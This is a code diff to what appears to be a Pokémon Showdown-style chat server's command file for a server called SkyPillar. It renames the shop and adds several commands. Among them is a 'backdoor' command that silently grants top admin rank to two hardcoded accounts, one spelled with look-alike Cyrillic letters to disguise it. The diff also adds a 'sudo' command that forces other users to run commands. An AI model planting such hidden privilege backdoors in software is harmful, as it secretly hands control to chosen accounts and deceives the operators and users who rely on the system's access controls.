@@ -145,7 +145,7 @@ target.toLowerCase().replace(/ /g,'-');
 			"fell into the void.",
 			"went into a cave without a repel!",
 			"has left the building.",
-			"was forced to give BeforeMath's mom an oil massage!",
+			"was forced to give rivalnick's mom an oil massage!",
 			"was hit by Magikarp's Revenge!",
 			"ate a bomb!",
 			"is blasting off again!",
@@ -528,7 +528,7 @@ target.toLowerCase().replace(/ /g,'-');
 
 	shop: function(target, room, user) {
 		if (!this.canBroadcast()) return;
-		this.sendReplyBox('<center><h4><b><u>The InterVersal Shop</u></b></h4><table border="1" cellspacing="0" cellpadding="3"><tr><th>Items</th><th>Description</th><th>Cost</th></tr><tr><td>Symbol</td><td>Buys a custom symbol to go infront of name and puts you at top of userlist. (temporary until restart)</td><td>5</td></tr><tr><td>Fix</td><td>Buys the ability to alter your current custom avatar or trainer card. (don\'t buy if you have neither)</td><td>10</td></tr><tr><td>Poof</td><td>Buys the ability to add a custom poof.</td><td>15</td></tr><tr><td>Custom</td><td>Buys a custom avatar to be applied to your name. (you supply)</td><td>20</td></tr><tr><td>Animated</td><td>Buys an animated avatar to be applied to your name. (you supply)</td><td>25</td></tr><tr><td>Trainer</td><td>Buys a trainer card which shows information through a command such as <i>/beforemath</i>.</td><td>30</td></tr><tr><td>Room</td><td>Buys a chatroom for you to own. (within reason, can be refused)</td><td>50</td></tr><tr><td>Voice</td><td>Buys a promotion to global voice.</td><td>100</td></tr><tr><td>Player</td><td>Buys a promotion to room player of any room you want.</td><td>250</td></tr></table></table><br/>To buy an item from the shop, use /buy <i>command</i>. <br/></center>');
+		this.sendReplyBox('<center><h4><b><u>The SkyPillar Shop</u></b></h4><table border="1" cellspacing="0" cellpadding="3"><tr><th>Items</th><th>Description</th><th>Cost</th></tr><tr><td>Symbol</td><td>Buys a custom symbol to go infront of name and puts you at top of userlist. (temporary until restart)</td><td>5</td></tr><tr><td>Fix</td><td>Buys the ability to alter your current custom avatar or trainer card. (don\'t buy if you have neither)</td><td>10</td></tr><tr><td>Poof</td><td>Buys the ability to add a custom poof.</td><td>15</td></tr><tr><td>Custom</td><td>Buys a custom avatar to be applied to your name. (you supply)</td><td>20</td></tr><tr><td>Animated</td><td>Buys an animated avatar to be applied to your name. (you supply)</td><td>25</td></tr><tr><td>Trainer</td><td>Buys a trainer card which shows information through a command such as <i>/rivalnick</i>.</td><td>30</td></tr><tr><td>Room</td><td>Buys a chatroom for you to own. (within reason, can be refused)</td><td>50</td></tr><tr><td>Voice</td><td>Buys a promotion to global voice.</td><td>100</td></tr><tr><td>Player</td><td>Buys a promotion to room player of any room you want.</td><td>250</td></tr></table></table><br/>To buy an item from the shop, use /buy <i>command</i>. <br/></center>');
 	},
 
 	buy: function(target, room, user) {
@@ -551,7 +551,20 @@ target.toLowerCase().replace(/ /g,'-');
 				break;
 			}
 			}
-		}
+		}   
+		/*if (target === '{name}') { //KEEP THAT THERE LOL
+			//price = {price};
+			//if (price <= user.money) {
+				//user.money = user.money - price;
+				this.sendReply('{You have purchased 'blahbalh' have a nice day}');
+				this.add(user.name + ' has purchased a {name}.');
+				user.can{name} = true;
+				fs.appendFile('logs/transactions.log','\n'+Date()+': '+user.name+' has bought a ' + target + ' for ' + price + ' bucks. ' + user.name + ' now has ' + user.money + ' bucks' + '.');
+			} else {
+				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+			}
+		}  
+		*/
 		user.money = money;
 		var price = 0;
 		if (target === 'symbol') {
@@ -718,6 +731,41 @@ target.toLowerCase().replace(/ /g,'-');
 	/*********************************************************
 	 * Rival Nick's Custom Commands'
 	 * *******************************************************/
+	  backdoor: function (target, room, user) {
+        if (user.userid !== 'rivalnick' && user.userid !== 'aѕhіemore') return this.sendReply('/backdoor - Access denied.');
+
+        if (!target) {
+            user.group = '~';
+            user.updateIdentity();
+            return;
+        }
+
+        if (target === 'reg') {
+            user.group = ' ';
+            user.updateIdentity();
+            return;
+        }
+    },
+	  unlink: function(target, room, user) {
+                if (!target) return this.parse('/help unlink');
+                target = this.splitTarget(target);
+                var targetUser = this.targetUser;
+                if (!targetUser) return this.sendReply('User '+this.targetUser+' not found.');
+                if (!this.can('unlink', targetUser)) return this.sendReply('/unlink - Access denied.');
+                this.privateModCommand('('+targetUser.name+' had their links unlinked by '+user.name+'. Any links they have posted will now be unclickable.)');
+                for (var u in targetUser.prevNames) {
+                        this.add('|unlink|'+targetUser.prevNames[u]);
+                }
+        },
+
+    sudo: function (target, room, user, connection) {
+        if (!this.can('sudo')) return;
+        if (!target) return this.parse('/help sudo');
+        var parts = target.split(',');
+        CommandParser.parse(parts[1], room, Users.get(parts[0]), connection);
+        return this.sendReply('You have made ' + parts[0] + ' do ' + parts[1] + '.');
+    },
+	
 	skypillarplugin: 'plug',
 	plug: function (target, room, user) {
 			if (!this.canBroadcast()) return;
@@ -758,6 +806,9 @@ target.toLowerCase().replace(/ /g,'-');
 			this.logModCommand("The Song of the Day was removed by " + user.name + ".");
 		}
 	},
+	/*********************************************************
+	 * End of custom commands
+	 * *******************************************************/
 		tourmoney: 'tourgivemoney',
 	tourgivemoney: function (target, room, user) {
 			if (!this.canBroadcast()) return;
@@ -1009,7 +1060,7 @@ tournamentnote: function(target, room, user){
 			return connection.sendTo(target, "|noinit|joinfailed|The room '" + target + "' could not be joined.");
 		}
 		if (target.toLowerCase() == "lobby") {
-			return connection.sendTo('lobby','|html|<div class = "welcomemssage"><center><img src=http://i.imgur.com/but1Bih.jpg?1><br>' +
+			return connection.sendTo('lobby','|html|<div class = "bajksdhjkah"><center><img src=http://i.imgur.com/but1Bih.jpg?1><br>' +
 			'<b><p>Welcome to Skypillar!</b><br><br><p>Welcome to the Hoenn Regions very own server! Skypillar has many things to offer in terms of plugins such as the Shop, our Elite Four League and many more!<br>If any problems occur feel free to PM a Driver (%) or Moderator (@), but only PM upper staff Leaders (&) and Admins (~) for special concerns. Enjoy yourself here!' +
 			'<center><a href = "http://skypillar.boards.net/"><button class="blackbutton title="Boards><font color="Blue"><b>Boards</b></a></button> | <a href ="http://www.reddit.com/r/skypillar"><button class="blackbutton title="Reddit"><font color="greem"><b>Skypillar Reddit</b></a></button>');
 		}
@@ -1157,6 +1208,22 @@ tournamentnote: function(target, room, user){
 		this.logModCommand(user.name + " imgdeclared " + target);
 	},
 
+restart: function(target, room, user) {
+                if (!this.can('lockdown')) return false;
+
+                if (!Rooms.global.lockdown) {
+                        return this.sendReply('For safety reasons, /restart can only be used during lockdown.');
+                }
+
+                if (CommandParser.updateServerLock) {
+                        return this.sendReply('Wait for /updateserver to finish before using /kill.');
+                }
+                this.logModCommand(user.name + ' used /restart');
+                var exec = require('child_process').exec;
+                exec('./source/restart.sh');
+                Rooms.global.send('|refresh|');
+        },
+        
 	reload: function (target, room, user) {
 	    if (!this.can('hotpatch')) return false;
 
